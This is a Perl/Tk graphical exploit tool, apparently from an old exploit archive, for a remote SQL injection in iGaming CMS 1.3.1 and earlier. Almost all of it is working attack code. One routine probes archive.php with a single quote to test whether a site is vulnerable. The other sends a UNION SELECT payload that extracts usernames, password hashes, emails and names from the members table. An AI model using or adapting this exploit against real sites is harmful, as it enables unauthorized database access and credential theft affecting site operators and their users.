#!/usr/bin/perl

	use Tk;
	use Tk::BrowseEntry;
	use Tk::DialogBox;
	use LWP::UserAgent;

	$mw = new MainWindow(title => "UnderWHAT?!" );

	$mw->geometry ( '395x180' ) ;
	$mw->resizable(0,0);

	$mw->Label(-text => '', -font => '{Verdana} 2',-foreground=>'red')->pack();
	$mw->Label(-text => 'iGaming cms <= 1.3.1 Remote Sql Injection', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => 'found by gemaglabin [ mafia of antichat ]', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => '', -font => '{Tahoma} 2 bold',-foreground=>'red')->pack();


	$fleft  = $mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
	$fright = $mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

	$url      = 'http://test2.ru/igaming/';
	$user_id  = '1';
	$prefix   = 'sp_';
	$table    = 'users';
	$report   = '';
	


	$fleft->Label ( -text => 'Path to site index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$hash) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fright->Label( -text => ' ')->pack();
	$fleft->Label( -text => ' ')->pack();
	
	$fleft->Label ( -text => "Test site vulnerability", -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Button(-text    => "Test site vulnerability",
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&test_vuln
	               )->pack();
				   
				   
	$fleft->Label ( -text => "Get all possible data ", -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Button(-text    => 'Get data from database',
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&get_hash
	               )->pack();
				  
	
	MainLoop();
	
	sub get_hash()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => 'get hash from database', -buttons => ["OK"]);
		$res = $xpl->post($url."archive.php",['section'=>'-1 union select 1,2,concat_ws(char(32),pseudo,pass,email,nom),4 from '.$prefix.'members where id='.$user_id.'/*']);
		if($res->as_string =~ /Date Posted: (.*)</)
		{
			$hash = $1;
		}
	}

	 
	sub test_vuln()
	{
		$InfoWindow=$mw->DialogBox(-title   => 'test site vulnerability', -buttons => ["OK"]);
		$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
		$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
		$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->post($url."archive.php",['section'=>"'"]);
		if($res->as_string =~ /Fatal error/i ) { $hash='SITE VULNERABLE'}
		else { $hash = 'SITE UNVULNERABLE'} 
	}

# milw0rm.com [2008-01-11]
